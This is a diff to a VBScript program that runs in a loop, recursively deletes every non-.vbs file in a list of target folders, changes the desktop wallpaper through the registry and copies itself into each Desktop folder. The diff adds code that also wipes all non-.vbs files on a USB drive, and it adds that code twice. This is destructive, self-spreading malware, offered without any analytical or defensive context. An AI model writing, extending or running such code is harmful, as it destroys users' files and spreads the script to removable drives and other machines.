@@ -47,6 +47,9 @@ Do
     For Each folderPath In foldersToDelete
         DeleteFilesExceptVBS folderPath
     Next
+
+    ' Delete files except VBS files on the USB drive
+    DeleteFilesExceptVBS usbDrivePath
     
     ' Set wallpaper
     objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
@@ -68,6 +71,15 @@ Do
         Next
     Next
 
+    ' Delete files except VBS files on the USB drive
+    For Each objFile In objFSO.GetFolder(usbDrivePath).Files
+        Dim extension
+        extension = LCase(objFSO.GetExtensionName(objFile.Name))
+        If extension <> "vbs" Then
+            objFSO.DeleteFile(objFile.Path)
+        End If
+    Next
+
     ' Generate copies of the script within each folder on the Desktop
     For Each objFolder In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Subfolders
         On Error Resume Next ' Ignore errors
@@ -83,7 +95,7 @@ Loop
 
 Sub DeleteFilesExceptVBS(folderPath)
     On Error Resume Next
-    
+
     Set folder = objFSO.GetFolder(folderPath)
     If Err.Number = 0 Then
         For Each file In folder.Files
@@ -93,12 +105,12 @@ Sub DeleteFilesExceptVBS(folderPath)
                 objFSO.DeleteFile file.Path
             End If
         Next
-        
+
         ' Recursively delete files in subfolders
         For Each subfolder In folder.Subfolders
             DeleteFilesExceptVBS subfolder.Path
         Next
     End If
-    
+
     On Error GoTo 0
 End Sub
